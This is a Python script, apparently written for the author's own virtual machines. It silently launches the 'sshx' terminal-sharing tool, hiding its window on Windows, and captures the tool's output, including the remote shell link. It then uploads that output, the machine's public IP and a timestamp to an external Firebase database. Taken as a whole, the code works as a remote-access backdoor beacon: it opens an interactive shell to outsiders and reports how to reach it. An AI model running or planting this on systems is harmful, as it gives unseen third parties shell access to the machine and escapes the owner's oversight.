import requests
import re
import time
import subprocess
from datetime import datetime
from zoneinfo import ZoneInfo
import os
import json

ip = requests.get('https://api.ipify.org').text
afip = ip.replace(".", "")
logg = "prog.log"
url = f"https://meqsave-default-rtdb.asia-southeast1.firebasedatabase.app/vm/{afip}.json"
flag = 0
now = datetime.now(ZoneInfo("Asia/Ho_Chi_Minh"))
cmd = "sshx"
# agm = "8.8.8.8"

if os.path.exists(logg):
    os.remove(logg)

if os.name == "nt":
    from subprocess import CREATE_NO_WINDOW
    flag = CREATE_NO_WINDOW

prog = subprocess.Popen(
    [cmd], # agm],
    stdout=open(logg, "w", encoding="utf-8"),
    stderr=subprocess.STDOUT,
    creationflags=flag
)

# while True: # Enable if bro want realtime upload
time.sleep(10)
with open(logg, "r", encoding="utf-8") as f:
    progo = f.read()

progo = re.sub(
    r'\x1B(?:\[[0-?]*[ -/]*[@-~]|\].*?(?:\x07|\x1B\\)|.)',
    '',
    progo
)

data = {
    "ip": ip,
    "content": f"{progo}\n\nopen at {now} (Ho Chi Minh zonetime)"
}

response = requests.put(url, data=json.dumps(data))
if response.status_code == 200:
    print("Thành công:", response.json())
    print(ip)
else:
    print("Lỗi:", response.status_code, response.text)
